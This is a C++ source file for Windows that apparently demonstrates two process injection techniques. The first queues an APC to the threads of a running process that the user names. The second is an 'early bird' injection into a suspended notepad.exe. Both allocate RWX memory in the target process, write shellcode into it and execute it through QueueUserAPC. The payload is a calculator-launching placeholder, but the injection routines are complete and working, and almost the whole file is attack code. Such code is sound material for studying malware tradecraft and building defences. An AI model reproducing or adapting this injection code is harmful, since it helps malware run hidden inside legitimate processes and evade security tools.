#include <Windows.h>

#include <format>
#include <string>

#include "ulib.h"

#if _WIN64
static constexpr uint8_t g_shellcode[206] = ul::shellcodes::x64::pop_calc;
#else
static constexpr uint8_t g_shellcode[201] = ul::shellcodes::x86::pop_calc;
#endif

static auto regular_apc_queue_code_injection(std::string const &process_name) -> bool
{
  LPVOID shellcode_addr = NULL;
  auto found = ::ul::walk_threads_using_toolhelp(process_name, [&](::ul::Thread const &thread) -> ::ul::walk_t {
    if (!shellcode_addr) {
      ::ul::info("Inject shellcode into target process");
      auto process_handle = ::OpenProcess(PROCESS_ALL_ACCESS, 0, thread.process.pid);
      shellcode_addr = ::VirtualAllocEx(process_handle, NULL, sizeof(g_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(process_handle, shellcode_addr, g_shellcode, sizeof(g_shellcode), NULL);
    }

    ::ul::info(std::format("Queue APC to target thread {}", thread.tid));
    auto thread_handle = ::OpenThread(THREAD_ALL_ACCESS, TRUE, thread.tid);
    ::QueueUserAPC((PAPCFUNC)shellcode_addr, thread_handle, NULL);
    Sleep(1000);
    return ::ul::walk_t::WALK_CONTINUE;
  });

  if (!found) {
    ::ul::error("Process not found");
  }

  return found;
}

static auto early_bird_apc_queue_code_injection(std::string const &process_name) -> bool
{
  auto si = STARTUPINFO{0};
  auto pi = PROCESS_INFORMATION{0};
  LPVOID shellcode_addr = NULL;
  ::ul::info(std::format("Create target process {}", process_name));
  auto ok = ::CreateProcessA(process_name.c_str(),  // name of the module to be executed
                             NULL,                  // the command line to be executed
                             NULL,                  // SECURITY_ATTRIBUTES for the new process
                             NULL,                  // SECURITY_ATTRIBUTES for the new thread
                             FALSE,                 // inherit handles
                             CREATE_SUSPENDED,      // creation flags
                             NULL,                  // environment
                             NULL,                  // current workign directory
                             &si, &pi);
  if (!ok) {
    ::ul::error(std::format("Cannot create process {}", process_name));
    goto Error;
  }

  ::ul::info("Allocate shellcode region into target process");
  shellcode_addr = ::VirtualAllocEx(pi.hProcess,            // target process
                                    NULL,                   // desired starting address for the region of pages that you want to allocate
                                    sizeof(g_shellcode),    // size of the allocation
                                    MEM_COMMIT,             // allocation type
                                    PAGE_EXECUTE_READWRITE  // memory protection
  );
  if (!shellcode_addr) {
    ::ul::error("Cannot allocate memory region (rwx) in target process");
    goto Error;
  }

  ::ul::info("Write shellcode into target process");
  ok = ::WriteProcessMemory(pi.hProcess,          // target process
                            shellcode_addr,       // memory region in target process
                            g_shellcode,          // data
                            sizeof(g_shellcode),  // data size
                            NULL                  // number of bytes written
  );
  if (!ok) {
    ::ul::error(std::format("Cannot write to the area of memory in the target process {}", process_name));
    goto Error;
  }

  ::ul::info("Queue APC to suspended thread");
  if (::QueueUserAPC((PAPCFUNC)shellcode_addr,  // application-supplied APC function to be called when the thread performs an alertable wait operation
                     pi.hThread,                // target thread (must have the THREAD_SET_CONTEXT access right)
                     NULL                       // APC parameter
                     ) == 0) {
    ::ul::error("Cannot queue APC");
    goto Error;
  }

  ::ul::info("Resume suspended thread");
  if (::ResumeThread(pi.hThread) == -1) {
    ::ul::error("Cannot resume thread");
    goto Error;
  }

  return true;

Error:
  if (shellcode_addr) ::VirtualFreeEx(pi.hProcess, shellcode_addr, sizeof(g_shellcode), MEM_RELEASE);

  ::CloseHandle(pi.hProcess);
  return false;
}

int main(int argc, char **argv)
{
  auto ok = false;
  if (argc >= 2) {
    ok = regular_apc_queue_code_injection(std::string{argv[1]});
  } else {
    auto process_name = R"(C:\Windows\system32\notepad.exe)";
    ok = early_bird_apc_queue_code_injection(process_name);
  }

  return ok ? EXIT_SUCCESS : EXIT_FAILURE;
}